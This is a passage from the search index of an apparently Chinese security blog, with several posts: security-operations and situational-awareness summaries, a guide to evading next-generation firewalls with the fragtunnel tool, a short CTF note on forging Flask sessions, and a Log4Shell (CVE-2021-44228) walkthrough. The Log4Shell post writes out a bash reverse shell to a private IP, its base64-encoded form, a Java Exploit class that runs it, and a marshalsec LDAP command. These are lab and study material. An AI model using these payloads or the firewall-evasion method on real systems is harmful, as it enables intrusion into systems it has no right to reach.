注册人邮箱的价值</strong>：在渗透过程中，收集目标站注册人邮箱的价值。</li><li><strong>DNS在渗透中的作用</strong>：相关内容。</li></ul></li></ol></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试</title>
      <link href="/2024/11/13/2024-09-12-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
      <url>/2024/11/13/2024-09-12-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误😶‍🌫️" data-whm="文章部分缺失😯">  <script id="hbeData" type="hbeData" data-hmacdigest="97d4736d2fa7642c4049fbcdc7e5cc48b0061e9953397f32defd08f315ce4d0a"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">暂时还看不了哦🔑</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全运营思维导图</title>
      <link href="/2024/11/13/2024-09-10-%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/"/>
      <url>/2024/11/13/2024-09-10-%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="安全运营思维导图"><a href="#安全运营思维导图" class="headerlink" title="安全运营思维导图"></a>安全运营思维导图</h1><p><a href="/../assets/img/image-98.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-98.png" alt="alt text"></a></p><p>以下是对文档《安全运营之路》的总结：</p><ol><li><strong>对安全运营的理解</strong>：<ul><li><strong>是什么</strong>：未明确提及。</li><li><strong>做什么</strong>：包括满足价值需求和提升成熟度，涉及理论体系与工程框架，以及ATT&amp;CK攻击防御框架。</li><li><strong>怎么做</strong>：通过数据驱动，涵盖核心内容如SOC、安全威胁情报简述、安全数据分析平台等。</li></ul></li><li><strong>安全建设篇</strong>：<ul><li><strong>情报搜集</strong>：包括入侵检测系统等。</li><li><strong>安全平台的建设方案</strong>：未明确提及。</li><li><strong>情报分析实际研判案例</strong>：未明确提及。</li><li><strong>企业风控平台</strong>：未明确提及。</li></ul></li><li><strong>威胁情报篇</strong>：<ul><li><strong>情报生产</strong>：未明确提及。</li><li><strong>情报监控平台</strong>：未明确提及。</li><li><strong>情报落地</strong>：包括威胁信息流通与交换、情报驱动的自动化等。</li><li><strong>威胁检测与攻击溯源之间的桥梁</strong>：未明确提及。</li></ul></li><li><strong>威胁狩猎篇</strong>：<ul><li><strong>日志、告警与事件</strong>：未明确提及。</li><li><strong>主机应急响应</strong>：包括应急响应防守方视角（蓝队）。</li><li><strong>C2通讯的检测与分析</strong>：未明确提及。</li><li><strong>黑灰产基础设施</strong>：未明确提及。</li><li><strong>网络流量的检测与分析</strong>：未明确提及。</li><li><strong>隐蔽通讯的检测与分析</strong>：未明确提及。</li><li><strong>具体业务场景下的对抗</strong>：未明确提及。</li></ul></li><li><strong>攻防对抗篇</strong>：<ul><li><strong>物料与供应链层面的对抗</strong>：未明确提及。</li><li><strong>黑灰产对抗</strong>：包括攻击方视角（红队）、数据与算法层面的对抗、紫队视角等。</li><li><strong>黑灰产研究相关</strong>：未明确提及。</li></ul></li><li><strong>上游</strong>：<ul><li><strong>安全运营之路</strong>：未明确提及。</li><li><strong>云安全概论</strong>：未明确提及。</li></ul></li><li><strong>中游</strong>：<ul><li><strong>黑灰产形式</strong>：未明确提及。</li><li><strong>云原生与云技术</strong>：未明确提及。</li></ul></li><li><strong>下游</strong>：<ul><li><strong>云原生漏洞</strong>：未明确提及。</li><li><strong>产业链分析</strong>：未明确提及。</li></ul></li><li><strong>业务安全篇</strong>：<ul><li><strong>云安全篇</strong>：未明确提及。</li><li><strong>黑灰产分析</strong>：包括黑词与黑话。</li><li><strong>云中的信息搜集</strong>：包括代理与信息隐蔽技术。</li><li><strong>容器逃逸</strong>：未明确提及。</li><li><strong>站群与僵尸网络技术</strong>：未明确提及。</li><li><strong>容器镜像安全</strong>：未明确提及。</li><li><strong>应用安全相关</strong>：未明确提及。</li></ul></li><li><strong>扩展内容</strong>：<ul><li><strong>安全数据分析相关</strong>：未明确提及。</li><li><strong>安全学术研究篇</strong>：包括数据驱动安全概论、云环境下的自动化入侵溯源实战。</li><li><strong>安全开发篇</strong>：包括同源分析、事件归并、工程化实战思路。</li><li><strong>产品设计篇</strong>：包括攻击评估、攻击者画像、基于事件调查的分析能力提升。</li><li><strong>攻击者能力</strong>：未明确提及。</li><li><strong>攻击者行为</strong>：未明确提及。</li><li><strong>安全数据科学篇</strong>：包括TTPs（技战术组合）知识化表达、威胁趋势、预测、威胁狩猎、告警筛选与分析、威胁检测模型、基于数据的威胁检测、基于数据的隐蔽通讯检测、基于数据的代理通信检测（僵尸网络相关）、安全知识图谱、攻击者评估。</li><li><strong>研究方向与工程化项目</strong>：未明确提及。</li></ul></li></ol><p>安全运营的理论体系可能涉及以下方面：</p><ol><li><strong>价值需求与成熟度</strong>：满足企业或组织的安全需求，提升安全运营的成熟度，以应对各种安全威胁。</li><li><strong>ATT&amp;CK攻击防御框架</strong>：可能作为安全运营中的一种参考框架，用于指导攻击防御策略的制定和实施。</li><li><strong>数据驱动</strong>：以数据为核心，通过对安全数据的分析和处理，实现对安全威胁的检测、预警和响应。</li><li><strong>SOC（安全运营中心）</strong>：作为安全运营的核心组件，负责整合和管理安全信息，协调安全响应工作。</li><li><strong>安全威胁情报</strong>：包括情报的搜集、生产、监控、落地等环节，为安全运营提供情报支持。</li></ol><p>需要注意的是，以上仅为根据文档内容进行的推测，具体的安全运营理论体系还需要参考更多相关资料和实践经验。</p><p>总体而言，文档对安全运营的各个方面进行了概述，但具体内容在总结中大多未明确提及，需要进一步查看文档详细了解。</p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 安全运营 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 安全运营 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>态势感知安全检测</title>
      <link href="/2024/11/13/2024-09-08-%E6%80%81%E5%8A%BF%E6%84%9F%E7%9F%A5%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B/"/>
      <url>/2024/11/13/2024-09-08-%E6%80%81%E5%8A%BF%E6%84%9F%E7%9F%A5%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="态势感知安全检测"><a href="#态势感知安全检测" class="headerlink" title="态势感知安全检测"></a>态势感知安全检测</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">flowchart TD</span><br><span class="line">   A[开始] --&gt; B[背景与目标]</span><br><span class="line">   B --&gt; C[态势感知部署思路与功能]</span><br><span class="line">   C --&gt; D[态势感知监测实施方法]</span><br><span class="line">   D --&gt; E[攻防实战]</span><br><span class="line">   E --&gt; F[修筑流量监测纵深异构防御战线]</span><br><span class="line">   E --&gt; G[修筑重要系统防御战线]</span><br><span class="line">   E --&gt; H[构建协同预警体系]</span><br><span class="line">   H --&gt; I[应用效果]</span><br><span class="line">   I --&gt; J[后续工作]</span><br><span class="line">   J --&gt; K[结束]</span><br></pre></td></tr></table></figure><p>该文档中提到的具体措施包括：</p><ol><li><strong>修筑流量监测纵深异构防御战线</strong>：<ul><li>了解各流量监测安全产品优缺点，摸排现有流量镜像网中各流量镜像节点的流量情况。</li><li>统筹规划不同流量监测系统流量探针的流量分配方案，通过重做map、去重、过滤等手段解决“安全设备丢包、流量镜像网带宽占满”的问题。</li><li>收敛对外暴露或跨域暴露的高危端口、弱密码、管理后台等，清理内网失陷机器及违规行为。</li></ul></li><li><strong>修筑重要系统防御战线</strong>：<ul><li>收集网络日志、安全日志、应用日志、资产信息、威胁情报等5大类数据，包括多种具体日志。</li><li>编排数据源监控面板，依据历史基线定义每类数据源的收取频率，对未按时收到的日志进行标红显示并短信告警。</li><li>将重要系统（如堡垒机系统、域控服务器、VPN、数据交换系统等）、重要账号加入重点监控范畴。</li><li>在条件允许的情况下，对重要系统进行攻击测试，保证对其进行攻击或者变更能触发相关告警。</li></ul></li><li><strong>构建协同预警体系</strong>：<ul><li>整合实景化攻防技战术的深入研究成果以及强对抗环境下防御手段的创新应用，以智能化的方式实现海量攻击日志数据的自动关联分析，实时监测HW高危事件。</li><li>通过API对接威胁情报管理平台，对访问【客户名称】资产的全量互联网IP进行威胁情报匹配，根据匹配结果进行相应处理（加入重点关注清单或立即封禁）。</li><li>通过对接蜜罐系统，对攻击者的攻击行为进行捕获，获取攻击者相关信息，提升预警的精准度。</li><li>对攻击模型不断迭代，减少误报率和漏报率，实时扩展攻击模型。</li><li>提升安全态势感知平台中的数据质量，精准匹配数据模型。</li></ul></li><li><strong>后续工作</strong>：<ul><li>增加探针部署与各个网络节点，并与二级单位态势感知平台互联互通，建设中国【客户名称】网络安全态势感知一张图。</li><li>全面利用安全态势感知平台将SIP、情报、沙箱等多维安全产品集中管控，重点做好防守对抗自动化和安全态势可视化。<ul><li>防守对抗自动化：通过安全态势感知平台构建演习相关攻击分析场景，快速发现安全事件根源，确定攻击手段及评估攻击损失，实时、精准生成待封禁IP清单；结合安全技术自动化编排与响应，将封禁&#x2F;解封IP清单下发至两地三中心以及子公司的互联网墙进行实时封禁。</li><li>安全态势可视化：在安全态势感知平台设置多维度的安全风险指标，构建安全运营、安全运维为一体的安全态势总览；借助可视化程度高且细粒度、高精度的风险监测模型，及时发现和处置网络中的可疑事件；通过动态描绘攻击及防守趋势图，实现安全风险及态势的全景可视化管控。</li></ul></li></ul></li></ol></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 态势感知 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 态势感知 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绕过下一代防火墙</title>
      <link href="/2024/11/13/2024-09-05-bypassthenextfirewall%20copy/"/>
      <url>/2024/11/13/2024-09-05-bypassthenextfirewall%20copy/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><p>防火墙是网络安全的关键部分，它充当受信任的内部网络和不受信任的外部网络（如 Internet）之间的屏障。根据预定义的安全规则监控和控制传入和传出的网络流量。</p><p>防火墙可以作为硬件设备、软件应用程序或两者的组合来实现。它们有多种用途：</p><ol><li><p><strong>存取控制：</strong> 防火墙根据配置的规则来调节允许或阻止哪些网络连接。</p></li><li><p><strong>威胁预防：</strong> 它们可以防止各种外部威胁，例如恶意软件、病毒和潜在的黑客攻击。</p></li><li><p><strong>流量过滤：</strong> 防火墙可以配置为根据各种标准允许或阻止特定类型的网络流量，包括：</p><ul><li>源 IP 地址和目标 IP 地址</li><li>端口号</li><li>协议</li><li>应用层数据</li></ul></li></ol><p>4. <strong>日志记录和监控：</strong> 许多防火墙提供网络活动的详细日志，使安全团队能够检测和响应潜在威胁。</p><p>5. <strong>网络地址转换 （NAT）：</strong> 一些防火墙执行 NAT，这有助于向外部网络隐藏内部网络地址，从而增加额外的安全层。</p><p>现代防火墙超越了简单的数据包过滤。它们结合了深度数据包检测和应用程序级过滤等高级功能，以针对复杂的网络威胁提供更全面的保护。</p><p>在本文中，我们将重点介绍在 OSI 模型的第 7 层（也称为应用程序层）运行的防火墙。</p><h1 id="设计缺陷"><a href="#设计缺陷" class="headerlink" title="设计缺陷"></a>设计缺陷</h1><p>当您了解下一代防火墙 （NGFW） 的工作原理时，您可能会注意到一些有趣的事情。假设防火墙规则为<strong>只有组 A 可以使用 Web 端口（80 和 443）</strong>。使用 nmap 等工具进行初始端口扫描可能会显示许多开放端口，这可能会误导观察者认为防火墙配置错误或无效。但是，当尝试连接到那些看起来打开的端口时，连接很快就会意外断开。</p><p>此行为的一个具体示例可以在 <code>Cisco Firepower </code>威胁防御 （FTD） 中看到，它使用 Snort 引擎进行深度数据包检测。根据 Cisco 文档：</p><p>“为了让 <code>Snort </code>引擎确定应用程序，它必须检查几个数据包（通常为 3-10 个，具体取决于应用程序解码器）。因此，允许某些数据包通过 FTD 并到达目的地。允许的数据包仍根据“在确定访问控制规则之前使用的 <code>Access Policy &gt; Advanced &gt; Intrusion Policy</code>”选项进行入侵策略控制。</p><p>这意味着，即使连接似乎已启动，防火墙也可能在解析这些初始数据包后阻止它。这种方法允许防火墙对流量做出更明智的决策，但也可能导致出现实际上无法访问的“开放”端口。</p><p><a href="https://miro.medium.com/v2/resize:fit:952/0*dCFT-ep3rUNhCjGj" class="gallery-item"><img src="https://miro.medium.com/v2/resize:fit:952/0*dCFT-ep3rUNhCjGj"></a></p><p>要了解这种情况是如何发生的，了解 TCP 连接的工作原理会很有帮助。</p><p><a href="https://miro.medium.com/v2/resize:fit:700/0*lOZrpK46ED6M3_z0" class="gallery-item"><img src="https://miro.medium.com/v2/resize:fit:700/0*lOZrpK46ED6M3_z0"></a></p><p>建立 TCP 连接：</p><p>1. <strong>SYN：</strong> 客户端发送一个序列号为随机 A 的 SYN 数据包。</p><p>2. <strong>SYN-ACK：</strong> 服务器以 SYN-ACK 响应。确认编号为 A + 1，并将其自己的序列号设置为 B。</p><p>3. <strong>Acknowledgment：</strong> 客户端发送序号为 A + 1 且鸣谢编号为 B + 1 的 ACK。</p><p>从现在开始，应用程序可以开始通过创建的会话进行通信和发送数据。要关闭连接，要终止通信的终端节点将启动连接终止：</p><p>终止 TCP 连接：</p><p>1. <strong>FIN：</strong> 主机发送 FIN 数据包以开始关闭连接。</p><p>2. <strong>Acknowledgment：</strong> 另一位主持人确认 FIN。</p><p>3. <strong>FIN：</strong> 第二台主机在准备关闭时发送自己的 FIN。</p><p>4. <strong>Acknowledgment：</strong> 第一个主机发送最终 ACK。</p><h1 id="回归基础"><a href="#回归基础" class="headerlink" title="回归基础"></a>回归基础</h1><p>到目前为止，我们知道 IPS&#x2F;IDS 引擎最初会允许一些数据包通过，直到它确定它是否是恶意&#x2F;恶意流量。因此，我们可以改变常见的编程实践并利用此功能。</p><p>套接字调度的一般架构如下所示：</p><p><a href="https://miro.medium.com/v2/resize:fit:1400/0*n2MMEogst5L7XF46" class="gallery-item"><img src="https://miro.medium.com/v2/resize:fit:1400/0*n2MMEogst5L7XF46"></a></p><p>我们可以连接、发送数据、接收响应、关闭套接字并重复。这有助于避免被 IDS&#x2F;IPS 系统检测到，否则可能会阻止连接。修改后的算法如下所示：</p><p><a href="https://miro.medium.com/v2/resize:fit:1400/0*0Rq3FOJj6U9pkb1P" class="gallery-item"><img src="https://miro.medium.com/v2/resize:fit:1400/0*0Rq3FOJj6U9pkb1P"></a></p><p>这正是 <code>Fragtunnel</code> 所做的！</p><h2 id="Fragtunnel"><a href="#Fragtunnel" class="headerlink" title="Fragtunnel"></a>Fragtunnel</h2><p>这种基于 Python 的 TCP 隧道工具提供了一种绕过下一代防火墙的独特方法：</p><p><strong>基本功能：</strong></p><ol><li>它不同于传统代理或标准隧道。</li><li>允许将应用程序流量路由到目标服务器，避免 NGFW 检测。</li></ol><p><strong>操作机制：</strong></p><ol><li><strong>数据碎片化：</strong> 应用程序的传入数据被拆分为较小的块。</li><li><strong>多会话传输：</strong> 每个片段都通过单独的 TCP 会话单独发送。</li><li><strong>数据重组：</strong> 片段在目标位置重新组合以重建原始数据。</li><li><strong>最终交付：</strong> 重新组合的数据将转发到预期目标。</li></ol><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>要开始使用，只需从 GitHub 下载脚本并运行它。但是，请注意，需要设置隧道服务器和隧道客户端才能使脚本正常工作。</p><h3 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h3><p>在服务器上执行以下步骤：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/efeali/fragtunnel.git</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> fragtunnel/</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> python3 fragtunnel.py -b 127.0.0.1：80 -v**</span><br></pre></td></tr></table></figure><ul><li><strong>-b， –bind</strong>：指定 IP 地址和端口，隧道服务器将在其上侦听传入连接。</li><li><strong>v， –verbose</strong>：启用 verbose 模式，在运行隧道应用程序时提供更详细的输出或日志记录信息。</li></ul><h3 id="客户端："><a href="#客户端：" class="headerlink" title="客户端："></a>客户端：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> Python fragtunnel.py -p 1234 -t ：80 -T ：80 -v</span><br></pre></td></tr></table></figure><ul><li>-p、–port：指定本地应用程序将侦听以建立连接的端口号。</li><li>-t， –target：指定本地应用程序要连接到的目标服务器或服务的 IP 地址和端口。</li><li>-T， –Tunnel：指定隧道服务器的 IP 地址和端口，以便于本地应用程序和目标服务器之间的连接。</li></ul><p>一旦 <code>tunnel </code>客户端执行并连接到 <code>tunnel</code> 服务器，您就可以与目标进行交互，就像直接在计算机上本地访问它一样。</p><p><a href="https://miro.medium.com/v2/resize:fit:1400/0*qqUHgxReL14a9lXi" class="gallery-item"><img src="https://miro.medium.com/v2/resize:fit:1400/0*qqUHgxReL14a9lXi"></a></p><p><a href="https://miro.medium.com/v2/resize:fit:1400/0*ljeH8mwFDWsGjslX" class="gallery-item"><img src="https://miro.medium.com/v2/resize:fit:1400/0*ljeH8mwFDWsGjslX"></a></p><p>如果我们运行 tcpdump，我们会注意到所有通信都是与服务器进行的，在本例中为 AWS。</p><p><a href="https://miro.medium.com/v2/resize:fit:1400/0*20hXmz0-tmMvVrN8" class="gallery-item"><img src="https://miro.medium.com/v2/resize:fit:1400/0*20hXmz0-tmMvVrN8"></a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在许多情况下，当我们进行侦察时，我们注意到我们可以扫描服务器并获取端口信息，但是当我们尝试连接到系统时，它被防火墙阻止了。对这些下一代系统的工作原理有一点了解可以帮助我们克服它们。</p><p>大多数下一代防火墙使用的 IDS&#x2F;IPS 引擎允许一些数据包到达目的地，同时收集足够的信息来判断是允许还是阻止流量。这是一个设计缺陷，可以利用它让我们使用 <code>fragtunnel </code>等工具不受限制地访问服务器。</p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Device </category>
          
          <category> Firewall </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Sec </tag>
            
            <tag> Firewall </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2021总决赛babypython</title>
      <link href="/2024/11/13/2024-09-04-CISCN2021-%E6%80%BB%E5%86%B3%E8%B5%9Bbabypython/"/>
      <url>/2024/11/13/2024-09-04-CISCN2021-%E6%80%BB%E5%86%B3%E8%B5%9Bbabypython/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="题解思路"><a href="#题解思路" class="headerlink" title="题解思路"></a>题解思路</h1><p>伪造session，获取flag</p><ol><li><a href="/../assets/img/image-86.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-86.png" alt="alt text"></a></li></ol><p><code>uuid.getnode()</code>函数可以获取网卡mac地址并转换成十进制数返回</p><ol start="2"><li><p>获取网卡mac地址<br> <a href="/../assets/img/image-87.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-87.png" alt="alt text"></a></p></li><li><p>伪造session<br>flask manage session 为flask的session管理器，可以伪造session</p></li></ol></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> WebSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-44228</title>
      <link href="/2024/11/13/2024-09-04-CVE-2021-44228/"/>
      <url>/2024/11/13/2024-09-04-CVE-2021-44228/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="题解思路"><a href="#题解思路" class="headerlink" title="题解思路"></a>题解思路</h1><h2 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h2><p>该漏洞的主要原因是log4j在日志输出中，未对字符合法性进行严格的限制，执行了JNDI协议加载的远程恶意脚本，从而造成RCE。这里面有一个关键点就是，什么是JNDI,为什么JNDI可以造成RCE</p><h2 id="编写恶意代码"><a href="#编写恶意代码" class="headerlink" title="编写恶意代码"></a>编写恶意代码</h2><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.31.241/44443 0&gt;&amp;1</span><br></pre></td></tr></table></figure><h3 id="进行base64编码"><a href="#进行base64编码" class="headerlink" title="进行base64编码"></a>进行base64编码</h3><p><a href="/../assets/img/image-89.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-89.png" alt="alt text"></a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMxLjI0MS80NDQ0MyAwPiYx&#125;|&#123;<span class="built_in">base64</span>,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><h3 id="编写恶意类为了在LDAP服务中进行使用"><a href="#编写恶意类为了在LDAP服务中进行使用" class="headerlink" title="编写恶意类为了在LDAP服务中进行使用"></a>编写恶意类为了在LDAP服务中进行使用</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exploit</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;/bin/bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwMC4xMzEvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] argv)</span> &#123;</span><br><span class="line">        <span class="type">Exploit</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Exploit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><pre><code>`javac .\Exploit.java`</code></pre><h3 id="开启服务转发"><a href="#开启服务转发" class="headerlink" title="开启服务转发"></a>开启服务转发</h3><p><a href="/../assets/img/image-90.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-90.png" alt="alt text"></a></p><blockquote><p>实际应用过程中需要使用公网来反弹，或者端口映射</p></blockquote><h2 id="搭建服务器1389为LDAP服务的端口"><a href="#搭建服务器1389为LDAP服务的端口" class="headerlink" title="搭建服务器1389为LDAP服务的端口"></a>搭建服务器1389为LDAP服务的端口</h2><p>现在我们在攻击机marshalsec-0.0.3-SNAPSHOT-all.jar所在目录开启LDAP监听，命令中的1389为LDAP服务的端口</p><p><a href="https://github.com/mbechler/marshalsec.git">Repo</a></p><p><code>git clone https://github.com/mbechler/marshalsec.git</code></p><h2 id="开启服务"><a href="#开启服务" class="headerlink" title="开启服务"></a>开启服务</h2><p><a href="/../assets/img/image-91.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-91.png" alt="alt text"></a></p><p><a href="/../assets/img/image-92.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-92.png" alt="alt text"></a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="string">&quot;http://192.168.31.241:8080/#Exploit&quot;</span> 1389</span><br></pre></td></tr></table></figure><p><a href="/../assets/img/image-93.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-93.png" alt="alt text"></a></p><h2 id="发送请求"><a href="#发送请求" class="headerlink" title="发送请求"></a>发送请求</h2><p><a href="/../assets/img/image-95.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-95.png" alt="alt text"></a></p><h2 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h2><p><a href="/../assets/img/image-94.png" title="alt text" class="gallery-item"><img src="/../assets/img/image-94.png" alt="alt text"></a></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> WebSec </category>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> Sec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>成为赏金猎人的第一步</title>
      <link href="/2024/11/13/2024-09-03-%E6%88%90%E4%B8%BA%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AD%A5/"/>
      <url>/2024/11/13/2024-09-03-%E6%88%90%E4%B8%BA%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AD%A5/</url>
      
